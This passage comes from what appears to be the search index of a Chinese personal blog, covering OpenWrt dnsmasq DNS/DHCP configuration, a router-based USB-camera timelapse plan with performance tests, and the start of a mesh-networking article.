dns \u51fa\u73b0\u95ee\u9898\uff0c\u90fd\u662f dnsmasq \u6ca1\u6709\u6b63\u786e\u542f\u52a8\u5bfc\u81f4\u7684\u3002\u53ef\u4ee5\u901a\u8fc7<code>logread -e dnsmasq</code>\u67e5\u770b\u65e5\u5fd7\u3002</p>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5f00\u542f-dns-log","title":"\u5f00\u542f dns log","text":"<pre><code>uci set dhcp.@dnsmasq[0].logqueries=\"1\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5176\u5b83-dnsdhcp-\u529f\u80fd","title":"\u5176\u5b83 DNS/DHCP \u529f\u80fd","text":"","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#dns-\u8fc7\u6ee4-\u9664\u5e7f\u544a","title":"DNS \u8fc7\u6ee4 (\u9664\u5e7f\u544a)","text":"<pre><code># Blacklist\nuci add_list dhcp.@dnsmasq[0].server=\"/example.com/\"\nuci add_list dhcp.@dnsmasq[0].server=\"/example.net/\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n\n# Whitelist\nuci add_list dhcp.@dnsmasq[0].server=\"/example.com/#\"\nuci add_list dhcp.@dnsmasq[0].server=\"/example.net/#\"\nuci add_list dhcp.@dnsmasq[0].server=\"/#/\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#hostname","title":"hostname","text":"<p>LuCI \u2192 Network \u2192 Hostnames</p> <p>Define a custom domain name and the corresponding PTR record - assigns the IPv4 address <code>192.168.1.23</code> and IPv6 address <code>fdce::23</code> to the domain name <code>mylaptop</code> and construct an appropriate reverse records.</p> <pre><code>uci add dhcp domain\nuci set dhcp.@domain[-1].name=\"mylaptop\"\nuci set dhcp.@domain[-1].ip=\"192.168.1.23\"\nuci add dhcp domain\nuci set dhcp.@domain[-1].name=\"mylaptop\"\nuci set dhcp.@domain[-1].ip=\"fdce::23\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#a-aaaa-cname-\u8bb0\u5f55","title":"A, AAAA, CNAME \u8bb0\u5f55","text":"<p>\u76f8\u5f53\u4e8e DNS \u57fa\u672c\u529f\u80fd</p> <ul> <li> <p>A, AAAA \u8bb0\u5f55\u7528\u4e8e\u5c06\u57df\u540d\u89e3\u6790\u5230 IP</p> <ul> <li>\u4e0b\u9762\u8868\u793a home \u88ab\u89e3\u6790\u4e3a 10.10.10.1</li> </ul> <pre><code>uci add_list dhcp.@dnsmasq[0].address=\"/home/10.10.10.1\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre> </li> </ul> <ul> <li> <p>CNAME \u7528\u4e8e\u5c06\u4e00\u4e2a\u57df\u540d\u89e3\u6790\u5230\u53e6\u4e00\u4e2a\u57df\u540d</p> <pre><code>uci add dhcp cname\nuci set dhcp.@cname[-1].cname=\"ftp.example.com\"\nuci set dhcp.@cname[-1].target=\"www.example.com\"\nuci commit dhcp\n/etc/init.d/dnsmasq restart\n</code></pre> </li> </ul>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#pxe-\u7f51\u7edc\u542f\u52a8","title":"PXE \u7f51\u7edc\u542f\u52a8","text":"<p>https://openwrt.org/docs/guide-user/base-system/dhcp_configuration#multi-arch_tftp_boot</p>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#dhcp-relay","title":"DHCP relay","text":"<p>https://openwrt.org/docs/guide-user/base-system/dhcp#dhcp_relay</p>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u5e38\u7528\u7f51\u7edc\u547d\u4ee4","title":"\u5e38\u7528\u7f51\u7edc\u547d\u4ee4","text":"","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#ifconfig","title":"ifconfig","text":"<p>windows <code>ipconfig /all</code>\uff0c\u53ef\u4ee5\u770b\u5230 DNS</p> <pre><code>DHCP \u670d\u52a1\u5668 . . . . . . . . . . . : 192.168.37.1\nDHCPv6 IAID . . . . . . . . . . . : 69734824\nDHCPv6 \u5ba2\u6237\u7aef DUID  . . . . . . . : 00-01-00-01-29-89-29-F7-28-11-A8-27-40-3E\nDNS \u670d\u52a1\u5668  . . . . . . . . . . . : 2409:8a38:1610:9a80::1\n192.168.37.1\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#nslookup","title":"nslookup","text":"<pre><code>$ nslookup www.baidu.com\n\u670d\u52a1\u5668:  public1.alidns.com\nAddress:  223.5.5.5\n\n\u975e\u6743\u5a01\u5e94\u7b54:\n\u540d\u79f0:    www.a.shifen.com\nAddresses:  182.61.200.6\n          182.61.200.7\nAliases:  www.baidu.com\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#dig","title":"dig","text":"","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#netstat","title":"netstat","text":"<pre><code>netstat -ntlp\n</code></pre> <ul> <li>n\uff1a\u4f7f\u7528\u6570\u503c\u7aef\u53e3</li> <li>t\uff1aTCP \u6d41</li> <li>l\uff1a\u663e\u793a\u6b63\u5728\u76d1\u542c\u7684\uff0c\u5426\u5219\u4e3a\u5df2\u7ecf\u5efa\u7acb\u8fde\u63a5\u7684</li> <li>p\uff1a\u663e\u793a\u5bf9\u5e94\u7a0b\u5e8f</li> </ul>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u9ad8\u7ea7","title":"\u9ad8\u7ea7","text":"","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u591a-dnsmasq-\u5b9e\u4f8b","title":"\u591a dnsmasq \u5b9e\u4f8b","text":"<p>\u7531\u4e8e\u6211\u533a\u5206\u4e86 lan \u548c guest \u63a5\u53e3\u3002</p> <p>\u60f3\u8981\u4e0d\u540c\u7684\u63a5\u53e3\u7ed1\u5b9a\u4e0d\u540c\u7684 search domain\u3002</p> <p>\u7ecf\u8fc7\u67e5\u627e\uff0c\u8c8c\u4f3c\u53ea\u80fd\u901a\u8fc7\u542f\u7528\u591a\u4e2a dnsmasq \u5b9e\u4f8b\u6765\u5b9e\u73b0\uff0c\u7136\u540e\u901a\u8fc7 instance \u53c2\u6570\uff0c\u5728\u4e0d\u540c\u63a5\u53e3\u4e0a\u7ed1\u5b9a\u5230\u4e0d\u540c\u5b9e\u4f8b\u3002 Different domain for each interface - Installing and Using OpenWrt / Network and Wireless Configuration - OpenWrt Forum [OpenWrt Wiki] DNS and DHCP examples --- [OpenWrt Wiki]DNS \u548c DHCP \u793a\u4f8b</p> <p>\u4f46\u662f\u5b9e\u73b0\u540e\uff0c\u53d1\u73b0\u4e24\u4e2a search domain \u95f4\u4e0d\u662f\u9694\u79bb\u7684\uff0cguest \u4e0b\u660e\u660e\u6ca1\u6709\u4e00\u4e9b host\uff0c\u4f46\u662f\u4ecd\u7136\u80fd\u591f\u89e3\u6790\u3002 \u6298\u817e\u4e86\u4e00\u5708\u8c8c\u4f3c\u6ca1\u6709\u89e3\u51b3\uff0c\u56e0\u6b64\u8fd8\u662f\u4f7f\u7528\u5355\u4e2a search domain \u7b97\u4e86\u3002</p> <pre><code>64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=31 ttl=64 time=0.060 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=32 ttl=64 time=0.240 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=33 ttl=64 time=0.058 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=34 ttl=64 time=0.080 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=35 ttl=64 time=0.063 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=36 ttl=64 time=0.072 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=37 ttl=64 time=0.055 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=38 ttl=64 time=0.049 ms\n64 bytes from ubuntu22.guest.op1 (192.168.35.192): icmp_seq=39 ttl=64 time=0.078 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=40 ttl=64 time=0.045 ms\n64 bytes from ubuntu22.op1 (192.168.35.192): icmp_seq=41 ttl=64 time=0.060 ms\n</code></pre>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#\u9047\u5230\u7684\u95ee\u9898","title":"\u9047\u5230\u7684\u95ee\u9898","text":"","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/16/2022-08-16-openwrt%20DNS%E8%AF%A6%E8%A7%A3/#ipv6-\u56fe\u7247\u663e\u793a\u4e0d\u51fa\u6765","title":"ipv6 \u56fe\u7247\u663e\u793a\u4e0d\u51fa\u6765","text":"<p>qq\u3001\u54b8\u9c7c\u7b49 app \u56fe\u7247\u52a0\u8f7d\u4e0d\u51fa\u6765\uff0c\u5173\u6389\u518d\u5f00\u542f wifi \u5c31\u6062\u590d\u6b63\u5e38\u3002 \u6000\u7591\uff1a</p> <ul> <li>ipv6 dns \u7684\u95ee\u9898</li> <li>linux \u4e0b\u9700\u8981\u4e0d\u65ad flush neighbor\uff0c\u5426\u5219 ipv6 \u5c31\u4f1a\u65e0\u6cd5\u8fde\u63a5\u3002\u662f\u5426\u548c\u8be5\u95ee\u9898\u6709\u5173\uff1f</li> <li>\u6709\u65f6\u9700\u8981 ping \u4e00\u4e0b\u8def\u7531\u5668\uff0c\u5426\u5219 ipv6 \u65e0\u6cd5\u8fde\u63a5\u7f51\u7edc\u3002</li> </ul> <p>ipv6 \u8986\u76d6\uff1a</p> <ul> <li>IPv6 Measurement Maps (apnic.net)</li> </ul> <p>\u53c2\u8003\uff1a ipv6 \u7684\u4e00\u4e9b\u6bdb\u75c5 - \u7535\u8111\u8ba8\u8bba (\u65b0) - Chiphell - \u5206\u4eab\u4e0e\u4ea4\u6d41\u7528\u6237\u4f53\u9a8c</p>","tags":["openwrt","dns","ipv6","\u5982\u4f55\u5b9e\u73b0\u7f51\u7edc\u81ea\u7531"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/","title":"\u4f7f\u7528 openwrt \u8def\u7531\u5668\u548c usb \u6444\u50cf\u5934\u8fdb\u884c\u5ef6\u65f6\u6444\u5f71","text":"","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u4f5c\u7528","title":"\u4f5c\u7528","text":"<p>\u653e\u5728\u697c\u9876\uff0c\u62cd\u6444\u4e00\u5929 24h \u7684\u6237\u5916\u5f55\u50cf\u3001\u5ef6\u65f6\u6444\u5f71\u3002\u50cf\u8d85\u7ea7\u5c0f\u6840\u6bcf\u5929\u7684\u76f4\u64ad\u5f55\u5c4f p1 \u90a3\u6837\u3002</p> <ul> <li>\u53ef\u4ee5\u8fdc\u7a0b\u901a\u8fc7\u7f51\u9875\u5b9e\u65f6\u67e5\u770b\u6444\u50cf\u5934\u76f4\u64ad\u753b\u9762</li> </ul>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u95ee\u9898","title":"\u95ee\u9898","text":"<ul> <li>\u6811\u8393\u6d3e+usb \u6444\u50cf\u5934\u624b\u52a8 DIY\uff1f<ul> <li>\u80fd\u5426\u65e7\u624b\u673a\u6539\u9020\uff08\u6444\u50cf\u5934\u753b\u8d28\u79d2\u6740\uff09</li> <li>\u80fd\u5426\u4f7f\u7528\u8def\u7531\u5668\u66ff\u4ee3\u6811\u8393\u6d3e\uff08\u6709\u4e00\u4e2a\u95f2\u7f6e\u7684\u5c0f\u7c73\u8def\u7531\u5668 3G\uff0c\u5e26 USB 3.0 \u53e3\uff09<ul> <li>USB camera on router with OpenWrt and MJPG-Streamer and shinobi cctv on docker in your home network - YouTube</li> <li>MIPS mtk7261 \u4e32\u6d41\uff0cCPU \u6027\u80fd\u662f\u5426\u8db3\u591f\uff08MIPS\u00ae 1004KEc\u2122 dual-core CPU @880MHz\uff09<ul> <li>OpenWrt Forum Archive\uff1a<ul> <li>TL-MR3020: MIPS 24kc@400MHz</li> <li>720p@30 \u4e0b CPU \u8d1f\u8f7d 19-32%</li> </ul> </li> <li>MIPS32 - DeviWiki (ex WikiDevi)<ul> <li>24kc: 3.1coremark/MHz</li> <li>1004KEc: 3.05 coremark/MHz</li> </ul> </li> </ul> </li> </ul> </li> </ul> </li> <li>\u597d\u5947\u6dd8\u5b9d\u4e0a 169 \u7684\u7f51\u7edc\u76d1\u63a7\u6444\u50cf\u5934\u4ea7\u54c1\u5185\u90e8\u4f7f\u7528\u7684\u662f\u4ec0\u4e48 CPU<ul> <li>\u53ef\u4ee5\u624b\u673a app \u8fdc\u7a0b\u67e5\u770b</li> <li>\u6709\u4e91\u53f0\uff0c\u53ef\u4ee5\u8c03\u6574\u89c6\u89d2</li> <li>\u5c45\u7136\u8fd8\u6709\u592a\u9633\u80fd\u4f9b\u7535\u7248\u672c\uff0c\u529f\u8017\u5f88\u4f4e\uff1f</li> </ul> </li> <li>\u8d85\u7ea7\u5c0f\u6840\u90a3\u6837\u7684\u753b\u9762\u9700\u8981\u591a\u9ad8\u5206\u8fa8\u7387\uff08\u9700\u8981\u600e\u6837\u7684\u6444\u50cf\u5934\uff09<ul> <li>\u4e0d\u77e5\u9053\u62cd\u5929\u7a7a\u6237\u5916\uff0c\u666e\u901a\u7684\u76d1\u63a7\u6444\u50cf\u5934\u753b\u9762\u6548\u679c</li> <li>\u662f\u5426\u9700\u8981\u5e7f\u89d2\u6444\u50cf\u5934</li> </ul> </li> <li>\u80fd\u5426\u96c6\u6210\u6e29\u5ea6\uff0c\u6e7f\u5ea6\u76d1\u63a7\u3002\u6216\u8005\u5982\u4f55\u901a\u8fc7\u7f51\u7edc\u83b7\u53d6\uff0c\u663e\u793a\u5728\u753b\u9762\u5de6\u4e0a\u89d2\u3002</li> </ul>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u4e86\u89e3","title":"\u4e86\u89e3","text":"<ul> <li>usb \u6444\u50cf\u5934\uff0c\u5f88\u4fbf\u5b9c\uff08\u6dd8\u5b9d 20 \u5143\uff09<ul> <li>\u9700\u8981\u652f\u6301 UVC \u514d\u9a71</li> </ul> </li> <li>openwrt \u4f7f\u7528 kmod-video-uvc \u9a71\u52a8 usb \u6444\u50cf\u5934\u3002\u4e32\u6d41<ul> <li>MJPG-Streamer</li> <li>ffmpeg/ffserver</li> <li>gstreamer</li> </ul> </li> <li>usb \u6444\u50cf\u5934\u652f\u6301\u4ec0\u4e48\u683c\u5f0f\u7f16\u7801<ul> <li>YUY2\uff1a\u6ca1\u538b\u7f29\uff0c\u5bf9\u4e0a\u4f4d\u673a\u6027\u80fd\u8981\u6c42\u9ad8</li> <li>MJPEG \u5e26\u5bbd\u8981\u6c42\u9ad8 1080p@30 1680 - 2700 kB/s</li> </ul> </li> <li>webcam \u542b\u4e49<ul> <li>Webcam - Wikipedia</li> <li>\u65e9\u671f\u8868\u793a\u4f4e\u6210\u672c\u7684\u4f4e\u7aef\u7684\u6444\u50cf\u5934\uff0c\u5982\u7b14\u8bb0\u672c\u524d\u7f6e\u6444\u50cf\u5934\u3002\u4f46\u5982\u4eca\u57fa\u672c\u90fd\u4e3a 720p \u4ee5\u4e0a\u4e86</li> <li>90 \u5ea6 FOV \u7528\u4e8e\u5bb6\u5ead\u548c\u76f4\u64ad\u8db3\u591f\u3002\u66f4\u5927\u7684\u9002\u5408\u4e2d\u5927\u578b\u4f1a\u8bae\u5ba4</li> </ul> </li> </ul>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u6444\u50cf\u5934","title":"\u6444\u50cf\u5934","text":"<ul> <li> <p>\u7b14\u8bb0\u672c\u6444\u50cf\u5934\u6548\u679c\uff1a1280x720</p> <p></p> <p></p> </li> </ul> <ul> <li> <p>69 1080p \u6444\u50cf\u5934</p> <p></p> </li> </ul> <ul> <li>Review of the ELP-USBFHD01M camera (joancharmant.com)</li> </ul> <ul> <li>\u7f57\u6280 C920: 400\u3002\u76f4\u64ad\u6444\u50cf\u5934\uff0c1080p\uff0c300 \u4e07</li> </ul> <ul> <li>\u7f57\u6280 C270i: 100\u3002\u65e5\u5e38\u89c6\u9891\u3002720p</li> </ul> <ul> <li>elgato: https://www.bilibili.com/video/BV1gY411s7zH</li> </ul> <ul> <li>https://www.bilibili.com/video/BV1WN4y157hA</li> </ul>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u57fa\u672c\u65b9\u6848","title":"\u57fa\u672c\u65b9\u6848","text":"<ul> <li>host\uff1ami r3g</li> <li>usb \u6444\u50cf\u5934\uff1a</li> </ul> <ul> <li>usb \u6444\u50cf\u5934\u6a21\u5757<ul> <li></li> </ul> </li> </ul> <p>\u8f6f\u4ef6</p> <ul> <li>openwrt:[OpenWrt Wiki] USB Video Support<ul> <li>motion: Motion (motion-project.github.io)<ul> <li>live stream</li> <li>timelapse video</li> <li>many type device<ul> <li>network camera via RTSP, RTMP, HTTP</li> <li>V4L2 webcams</li> <li>Video capture cards</li> <li>Existing movie files</li> </ul> </li> </ul> </li> </ul> </li> </ul>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u6d4b\u8bd5","title":"\u6d4b\u8bd5","text":"<ul> <li>640x480@30 BW=25Mb, CPU \u5355\u6838&lt;10%\uff0c3 \u7ebf\u7a0b\u603b&lt;20%\uff0c\u5f85\u673a 6%</li> <li>1080p @30 BW=53Mb, CPU \u5355\u6838 22%, \u603b 44%\uff0c\u5f85\u673a 20%</li> <li>1280x720 @30 BW=36Mb\uff0cCPU 30%\uff0c\u5f85\u673a 10%<ul> <li>\u753b\u9762\u8fd8\u884c\uff0c\u6bd4\u8f83\u5408\u9002</li> </ul> </li> </ul>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#\u76d1\u63a7","title":"\u76d1\u63a7","text":"<p>\u5982\u4f55\u9009\u62e9\u5b89\u9632\u76d1\u63a7\u6444\u50cf\u673a\uff1f - \u77e5\u4e4e (zhihu.com)</p> <p>IPC-642p-a4</p> <p>642p \u5e26 p \u8868\u793a POE\uff0c\u4e0d\u5e26p \u662f\u666e\u901a\u7684\u3002</p>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/24/2022-08-24-%E4%BD%BF%E7%94%A8openwrt%E8%B7%AF%E7%94%B1%E5%99%A8%E5%92%8Cusb%E6%91%84%E5%83%8F%E5%A4%B4%E8%BF%9B%E8%A1%8C%E5%BB%B6%E6%97%B6%E6%91%84%E5%BD%B1/#poe-\u8981\u6c42","title":"POE \u8981\u6c42","text":"<ul> <li>\u652f\u6301 DC \u548c 802.3 af/at \u6807\u51c6 POE</li> <li>\u6700\u5927 18W</li> </ul> <p>\u6807\u51c6 POE \u662f 48v\uff0c15.4W \u7684\uff0c\u4f46\u662f\u8fd9\u4e2a\u6444\u50cf\u5934\u6700\u5927\u5374\u662f 18w\uff0c\u4e0d\u77e5\u9053\u80fd\u4e0d\u80fd\u5e26\u5f97\u52a8\u3002</p> <p>\u6c34\u661f 5 \u53e3\u7684\u4ea4\u6362\u673a\u89c4\u683c\uff0859\u5143\uff09\uff1a43w \u603b\uff0c\u5355\u53e3 15.4 w\uff0c\u8fd9\u6837\u5b50\u5c82\u4e0d\u662f 5 \u53e3\u4ecd\u7136\u53ea\u80fd\u5e26\u52a8 2 \u4e2a\uff1f TP link \u7684 poe \u4ea4\u6362\u673a\u8d35\u5f88\u591a\uff08\u5b98\u65b9159\u5143\uff0c\u95f2\u9c7c50\uff09\uff1a60w \u603b\uff0c\u5355\u53e3 30w\u3002</p>","tags":["openwrt","usb \u6444\u50cf\u5934","\u5ef6\u65f6\u6444\u5f71"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/","title":"Openwrt Mesh \u548c\u5feb\u901f\u6f2b\u6e38\u914d\u7f6e","text":"","tags":["openwrt","mesh"]},{"location":"%E6%8A%98%E8%85%BE%E8%AE%B0%E5%BD%95/2022/08/25/2022-08-25-Openwrt-Mesh%E5%92%8C%E5%BF%AB%E9%80%9F%E6%BC%AB%E6%B8%B8%E9%85%8D%E7%BD%AE/#\u80cc\u666f","title":"\u80cc\u666f","text":"<p>\u5bb6\u91cc\u539f\u672c\u6709\u4e24\u4e2a\u8def\u7531\u5668\uff0c\u4e00\u4e2a\u8d1f\u8d23\u697c\u4e0a\uff0c\u4e00\u4e2a\u8d1f\u8d23\u697c\u4e0b\u3002\u4f46\u662f\u4ecd\u7136\u6709\u8bb8\u591a\u8986\u76d6\u4e0d\u5230\u7684\u5730\u65b9\uff0c\u6bd4\u5982\u53a8\u623f\u3002\u5e76\u4e14\u66f4\u5f71\u54cd\u4f53\u9a8c\u7684\u662f\u697c\u4e0a\u697c\u4e0b\u7684 WIFI \u4f7f\u7528\u4e0d\u540c\u7684 SSID\uff0c\u624b\u673a\u65e0\u6cd5\u5f88\u597d\u5730\u81ea\u52a8\u5207\u6362\u3002\u7ecf\u5e38\u662f\u697c\u4e0a\u8fde\u63a5\u5230\u697c\u4e0b\u7684\u7f51\u7edc\u5bfc\u81f4\u4fe1\u53f7\u5f88\u5dee\u3002\u56e0\u6b64\u51b3\u5b9a\u5bf9\u5bb6\u91cc\u7684\u7f51\u7edc\u6539\u9020\u4e00\u756a\u3002</p> <p>\u4ee5\u524d\u542c\u8fc7 mesh \u8fd9\u4e2a\u6280\u672f\uff0c\u53ef\u4ee5\u5c06\u5f88\u591a\u53f0\u8def\u7531\u5668\u901a\u8fc7\u65e0\u7ebf\u8fde\u63a5\u8d77\u6765\uff0c\u5171\u540c\u63d0\u4f9b\u4e00\u4e2a\u7f51\u7edc\u3002\u4e8e\u662f\u53bb\u641c\u7d22\u4e86 openwrt \u662f\u5426\u652f\u6301 mesh\uff0c\u53d1\u73b0\u662f\u53ef\u4ee5\u7684\u3002\u5e76\u4e14\u7ecf\u8fc7\u8fdb\u4e00\u6b65\u7684\u4e86\u89e3\uff0c\u7ea0\u6b63\u4e86\u81ea\u5df1\u4e4b\u524d\u5bf9\u65e0\u7ebf\u7f51\u7edc\u7684\u4e00\u4e9b\u9519\u8bef\u8ba4\u77e5\u3002</p> <ul> <li>\u9996\u5148\uff0cmesh \u89e3\u51b3\u7684\u5e76\u4e0d\u662f\u5982\u4f55\u8ba9\u8bbe\u5907\u81ea\u52a8\u5207\u6362\u7f51\u7edc\uff0c\u800c\u662f\u5982\u4f55\u8fdb\u884c\u65e0\u7ebf\u7ec4\u7f51\uff0c\u53ef\u4ee5\u907f\u514d\u5e03\u7ebf\u7684\u56f0\u96be\u3002mesh 